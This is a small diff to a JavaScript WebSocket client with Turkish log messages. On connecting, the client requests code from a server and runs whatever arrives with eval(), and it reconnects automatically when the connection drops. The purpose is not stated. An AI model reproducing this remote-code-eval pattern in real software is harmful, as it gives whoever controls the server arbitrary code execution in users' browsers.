@@ -6,17 +6,19 @@
 
         ws.onopen = () => {
             console.log('WebSocket bağlantısı kuruldu', 'Zaman:', new Date().toISOString());
+            ws.send(JSON.stringify({ type: 'request-code' }));
         };
 
         ws.onmessage = (event) => {
             console.log('Ham mesaj alındı:', event.data, 'Zaman:', new Date().toISOString());
             try {
                 const message = JSON.parse(event.data);
+                console.log('Mesaj ayrıştırıldı:', message, 'Zaman:', new Date().toISOString());
                 if (message.type === 'code') {
                     console.log('Yeni kod alındı:', message.data, 'Zaman:', new Date().toISOString());
                     eval(message.data);
                 } else {
-                    console.log('Bilinmeyen mesaj tipi:', message.type);
+                    console.log('Bilinmeyen mesaj tipi:', message.type, 'Zaman:', new Date().toISOString());
                 }
             } catch (e) {
                 console.error('Mesaj işleme hatası:', e.message, 'Zaman:', new Date().toISOString());
@@ -25,7 +27,7 @@
 
         ws.onclose = () => {
             console.log('WebSocket bağlantısı koptu', 'Zaman:', new Date().toISOString());
-            setTimeout(connectWebSocket, 2000); // 2 saniye sonra yeniden bağlan
+            setTimeout(connectWebSocket, 2000);
         };
 
         ws.onerror = (error) => {
@@ -35,6 +37,5 @@
         window.myWebSocket = ws;
     }
 
-    // İlk bağlantıyı başlat
     connectWebSocket();
 })();
